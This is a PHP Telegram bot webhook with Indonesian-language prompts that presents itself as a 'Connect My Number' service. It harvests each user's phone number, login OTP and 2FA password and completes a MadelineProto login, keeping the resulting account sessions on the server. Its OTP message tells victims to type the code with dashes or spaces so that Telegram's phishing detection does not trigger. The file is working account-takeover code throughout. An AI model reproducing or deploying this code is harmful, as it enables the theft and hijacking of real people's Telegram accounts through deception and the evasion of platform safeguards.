<?php
require_once __DIR__ . '/core/database.php';
// Include Composer autoload for MadelineProto
if (file_exists(__DIR__ . '/vendor/autoload.php')) {
    require_once __DIR__ . '/vendor/autoload.php';
}

// ─── Telegram API Helper ──────────────────────────────────────────────────────
function tg(string $method, array $params): ?array {
    global $pdo;
    $settings = $pdo->query("SELECT bot_token FROM bot_settings WHERE id = 1")->fetch();
    if (!$settings || empty($settings['bot_token'])) return null;

    $url  = "https://api.telegram.org/bot{$settings['bot_token']}/$method";
    $ch   = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode($params),
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res ? json_decode($res, true) : null;
}

function sendMessage(int|string $chat_id, string $text, array $reply_markup = []): void {
    $params = [
        'chat_id'    => $chat_id,
        'text'       => $text,
        'parse_mode' => 'HTML',
    ];
    if (!empty($reply_markup)) {
        $params['reply_markup'] = $reply_markup;
    }
    tg('sendMessage', $params);
}

function answerCallback(string $callback_id, string $text = '', bool $alert = false): void {
    tg('answerCallbackQuery', [
        'callback_query_id' => $callback_id,
        'text'              => $text,
        'show_alert'        => $alert,
    ]);
}

// ─── MadelineProto Helper ─────────────────────────────────────────────────────
function getMadeline(int|string $telegram_id) {
    if (!is_dir(__DIR__ . '/sessions')) {
        mkdir(__DIR__ . '/sessions', 0777, true);
    }
    $settings = new \danog\MadelineProto\Settings();
    $settings->getLogger()->setLevel(\danog\MadelineProto\Logger::FATAL_ERROR);
    $settings->getPeer()->setCacheAllPeersOnStartup(false);
    
    // Official Telegram Android API ID/Hash (Often used for MTProto clients)
    $settings->getAppInfo()->setApiId(2040)->setApiHash('b18441a1ff607e10a989891a5462e627');
    
    $sessionPath = __DIR__ . "/sessions/session_{$telegram_id}.madeline";
    return new \danog\MadelineProto\API($sessionPath, $settings);
}

// ─── Main Menu Keyboard ───────────────────────────────────────────────────────
function mainMenuKeyboard(): array {
    return [
        'inline_keyboard' => [
            [
                ['text' => '📱 Connect My Number', 'callback_data' => 'menu_connect'],
                ['text' => '📊 My Status',          'callback_data' => 'menu_status'],
            ],
            [
                ['text' => '❓ Help',   'callback_data' => 'menu_help'],
                ['text' => '📞 Contact', 'callback_data' => 'menu_contact'],
            ],
        ]
    ];
}

// ─── Error Catcher ────────────────────────────────────────────────────────────
$current_chat_id = null;
register_shutdown_function(function() use (&$current_chat_id) {
    global $pdo;
    $error = error_get_last();
    if ($error && in_array($error['type'], [E_ERROR, E_CORE_ERROR, E_COMPILE_ERROR, E_PARSE])) {
        write_log('FATAL_ERROR', "{$error['message']} in {$error['file']}:{$error['line']}");
        if ($current_chat_id) {
            sendMessage($current_chat_id, "❌ <b>Sistem Crash / Timeout!</b>\n\nTerjadi kesalahan internal pada server (Fatal Error / Server Timeout). Pastikan ekstensi <b>ext-gmp</b> aktif di cPanel hosting untuk mempercepat kriptografi MTProto.\n\n<code>Admin dapat melihat logs/system.log</code>");
        }
    }
});

// ─── Input Payload ────────────────────────────────────────────────────────────
$input = file_get_contents('php://input');
if (!$input) {
    http_response_code(200);
    exit('OK');
}

$update = json_decode($input, true);
if (!$update) {
    write_log('WEBHOOK_ERROR', "Invalid JSON: $input");
    http_response_code(200);
    exit('OK');
}

if (DEV_MODE) {
    // Only log small part of update to prevent spam
    write_log('WEBHOOK_RAW', substr($input, 0, 500) . '...');
}

$settings = $pdo->query("SELECT * FROM bot_settings WHERE id = 1")->fetch();
$welcome_msg = !empty($settings['welcome_message'])
    ? $settings['welcome_message']
    : "👋 <b>Selamat datang!</b>\n\nPilih menu di bawah untuk melanjutkan.";

// ─── Handle Callback Query (button presses) ───────────────────────────────────
if (isset($update['callback_query'])) {
    $cb      = $update['callback_query'];
    $cb_id   = $cb['id'];
    $cb_data = $cb['data'];
    $chat_id = $cb['message']['chat']['id'];
    $from_id = $cb['from']['id'];

    $session = $pdo->prepare("SELECT * FROM user_sessions WHERE telegram_id = ?");
    $session->execute([$from_id]);
    $session = $session->fetch();

    switch ($cb_data) {
        case 'menu_connect':
            if ($session && $session['status'] === 'active') {
                answerCallback($cb_id, '✅ Akun kamu sudah terhubung dan aktif!', true);
                break;
            }
            if ($session && $session['status'] === 'banned') {
                answerCallback($cb_id, '🚫 Akun kamu telah dibanned.', true);
                break;
            }
            answerCallback($cb_id);
            sendMessage($chat_id,
                "📱 <b>Hubungkan Nomor Telegram</b>\n\n".
                "Silakan ketik dan kirim nomor HP kamu dengan format internasional:\n".
                "Contoh: <code>+62812xxxxxx</code>\n\n".
                "⚠️ Pastikan nomor tersebut terdaftar aktif di aplikasi Telegram.",
                ['inline_keyboard' => [[['text' => '🔙 Batal', 'callback_data' => 'menu_back']]]]
            );
            $pdo->prepare("INSERT INTO user_sessions (telegram_id, phone_number, status) VALUES (?, '', 'pending') ON DUPLICATE KEY UPDATE status = IF(status='banned','banned','pending')")->execute([$from_id]);
            break;

        case 'menu_status':
            answerCallback($cb_id);
            if (!$session) {
                $status_text = "❌ <b>Belum terdaftar.</b>\n\nKamu belum menghubungkan nomor apapun.";
            } else {
                $icon = match($session['status']) {
                    'active'        => '✅',
                    'pending'       => '⏳',
                    'wait_otp'      => '🔑',
                    'wait_password' => '🔒',
                    'banned'        => '🚫',
                    default         => '❓',
                };
                $status_text =
                    "$icon <b>Status Akun Kamu</b>\n\n".
                    "📱 Nomor: <code>".htmlspecialchars($session['phone_number'] ?: '—')."</code>\n".
                    "🔖 Status: <b>".ucfirst($session['status'])."</b>\n".
                    "📅 Didaftarkan: ".date('d M Y H:i', strtotime($session['created_at']));
            }
            sendMessage($chat_id, $status_text,
                ['inline_keyboard' => [[['text' => '🔙 Kembali', 'callback_data' => 'menu_back']]]]
            );
            break;

        case 'menu_help':
            answerCallback($cb_id);
            sendMessage($chat_id,
                "❓ <b>Bantuan Penggunaan</b>\n\n".
                "1. Klik <b>Connect My Number</b>\n".
                "2. Kirim nomor HP Telegram kamu.\n".
                "3. Telegram resmi akan mengirimkan <b>Kode OTP</b> ke aplikasimu.\n".
                "4. Kirim kode OTP tersebut ke bot ini.\n".
                "5. Jika diminta, kirim juga Password 2FA kamu.\n\n".
                "<i>Data sesi akan disimpan secara aman untuk kebutuhan layanan.</i>",
                ['inline_keyboard' => [[['text' => '🔙 Kembali', 'callback_data' => 'menu_back']]]]
            );
            break;

        case 'menu_contact':
            answerCallback($cb_id);
            sendMessage($chat_id,
                "📞 <b>Kontak Admin</b>\n\nUntuk bantuan lebih lanjut: @admin",
                ['inline_keyboard' => [[['text' => '🔙 Kembali', 'callback_data' => 'menu_back']]]]
            );
            break;

        case 'menu_back':
            answerCallback($cb_id);
            // Reset state if not active or banned
            if ($session && !in_array($session['status'], ['active', 'banned'])) {
                $pdo->prepare("UPDATE user_sessions SET status = 'pending' WHERE telegram_id = ?")->execute([$from_id]);
            }
            sendMessage($chat_id, $welcome_msg, mainMenuKeyboard());
            break;

        default:
            answerCallback($cb_id, 'Perintah tidak dikenal.', true);
    }

    http_response_code(200);
    exit('OK');
}

// ─── Handle Text Messages ─────────────────────────────────────────────────────
if (isset($update['message'])) {
    $msg     = $update['message'];
    $chat_id = $msg['chat']['id'];
    $from_id = $msg['from']['id'];
    $text    = trim($msg['text'] ?? '');
    
    global $current_chat_id;
    $current_chat_id = $chat_id;

    $session = $pdo->prepare("SELECT * FROM user_sessions WHERE telegram_id = ?");
    $session->execute([$from_id]);
    $session = $session->fetch();

    if ($text === '/start' || $text === '/menu') {
        $name = $msg['from']['first_name'] ?? 'Pengguna';
        $personalized = str_replace('{name}', htmlspecialchars($name), $welcome_msg);
        sendMessage($chat_id, $personalized, mainMenuKeyboard());
        http_response_code(200);
        exit('OK');
    }

    if ($session && $session['status'] === 'banned') {
        sendMessage($chat_id, "🚫 <b>Akses Ditolak.</b>\nAkun Telegram kamu telah dibanned.");
        http_response_code(200);
        exit('OK');
    }

    // STATE: PENDING (Waiting for Phone Number)
    if ($session && $session['status'] === 'pending' && preg_match('/^\+?[0-9]{8,15}$/', str_replace([' ', '-'], '', $text))) {
        $phone = preg_replace('/[^0-9+]/', '', $text);
        if (str_starts_with($phone, '08')) $phone = '+62' . substr($phone, 1);
        elseif (str_starts_with($phone, '62') && !str_starts_with($phone, '+')) $phone = '+' . $phone;

        sendMessage($chat_id, "🔄 <i>Sedang menghubungi Telegram... mohon tunggu.</i>");

        try {
            $API = getMadeline($from_id);
            $API->phoneLogin($phone);
            
            $pdo->prepare("UPDATE user_sessions SET phone_number = ?, status = 'wait_otp' WHERE telegram_id = ?")->execute([$phone, $from_id]);
            write_log('MTPROTO', "Phone Login requested for $phone (ID: $from_id)");

            sendMessage($chat_id,
                "📩 <b>Kode OTP Telah Dikirim!</b>\n\n".
                "Telegram resmi mengirimkan pesan berisi kode verifikasi ke aplikasimu.\n\n".
                "⚠️ <b>PENTING: JANGAN KIRIM KODE SECARA LANGSUNG!</b>\n".
                "Telegram akan <b>MEMBLOKIR</b> login jika kamu mengirim kode sebagai angka biasa ke chat ini (deteksi Phishing).\n\n".
                "👉 <b>Ketik kode dengan tanda hubung atau spasi di setiap angkanya.</b>\n".
                "Contoh jika kode <code>12345</code>, ketik:\n".
                "<code>1-2-3-4-5</code> atau <code>1 2 3 4 5</code>"
            );
        } catch (\Exception $e) {
            write_log('MTPROTO_ERR', "PhoneLogin error ($phone): " . $e->getMessage());
            sendMessage($chat_id, "❌ <b>Gagal mengirim OTP.</b>\nPastikan nomor benar atau coba lagi nanti.\n<code>Err: " . $e->getMessage() . "</code>", mainMenuKeyboard());
        }
        http_response_code(200);
        exit('OK');
    }

    // STATE: WAIT_OTP (Waiting for Telegram OTP Code)
    if ($session && $session['status'] === 'wait_otp') {
        $otp = trim(str_replace([' ', '-', '_', '.', ','], '', $text));
        
        sendMessage($chat_id, "🔄 <i>Sedang memverifikasi OTP...</i>");
        
        try {
            $API = getMadeline($from_id);
            $API->completePhoneLogin($otp);
            // Login Success!
            $pdo->prepare("UPDATE user_sessions SET status = 'active' WHERE telegram_id = ?")->execute([$from_id]);
            write_log('MTPROTO', "Login SUCCESS for $from_id");

            sendMessage($chat_id, "✅ <b>Verifikasi Berhasil!</b>\n\nNomor Telegram kamu sekarang sudah aktif di dalam sistem.", mainMenuKeyboard());
        } catch (\danog\MadelineProto\Exception\Require2FAException $e) {
            // Need 2FA Password
            $pdo->prepare("UPDATE user_sessions SET status = 'wait_password' WHERE telegram_id = ?")->execute([$from_id]);
            sendMessage($chat_id, "🔐 <b>Akun Dilindungi Password (2FA)</b>\n\nSilakan kirimkan password Cloud / 2FA kamu:");
        } catch (\Exception $e) {
            write_log('MTPROTO_ERR', "CompleteLogin error: " . $e->getMessage());
            sendMessage($chat_id, "❌ <b>OTP Salah atau Kadaluarsa.</b>\nSilakan coba lagi /connect dari awal.\n<code>Err: " . $e->getMessage() . "</code>");
            $pdo->prepare("UPDATE user_sessions SET status = 'pending' WHERE telegram_id = ?")->execute([$from_id]);
        }
        http_response_code(200);
        exit('OK');
    }

    // STATE: WAIT_PASSWORD (Waiting for 2FA Password)
    if ($session && $session['status'] === 'wait_password') {
        $password = trim($text);
        
        sendMessage($chat_id, "🔄 <i>Sedang menyelesaikan login...</i>");
        
        try {
            $API = getMadeline($from_id);
            $API->complete2faLogin($password);
            
            $pdo->prepare("UPDATE user_sessions SET status = 'active' WHERE telegram_id = ?")->execute([$from_id]);
            write_log('MTPROTO', "2FA Login SUCCESS for $from_id");

            sendMessage($chat_id, "✅ <b>Login Berhasil!</b>\n\nNomor Telegram kamu sekarang sudah aktif di sistem.", mainMenuKeyboard());
        } catch (\Exception $e) {
            write_log('MTPROTO_ERR', "2FALogin error: " . $e->getMessage());
            sendMessage($chat_id, "❌ <b>Password Salah.</b>\n\nSilakan ketik ulang password 2FA kamu:");
        }
        http_response_code(200);
        exit('OK');
    }

    // Default message
    if ($session && $session['status'] === 'active') {
        sendMessage($chat_id, "🔰 <b>Session Aktif</b>\n\nKetik /menu untuk melihat kembali opsi utama.");
    } else {
        sendMessage($chat_id, "Ketik /start atau pilih opsi di menu utama.", mainMenuKeyboard());
    }
}

http_response_code(200);
echo 'OK';
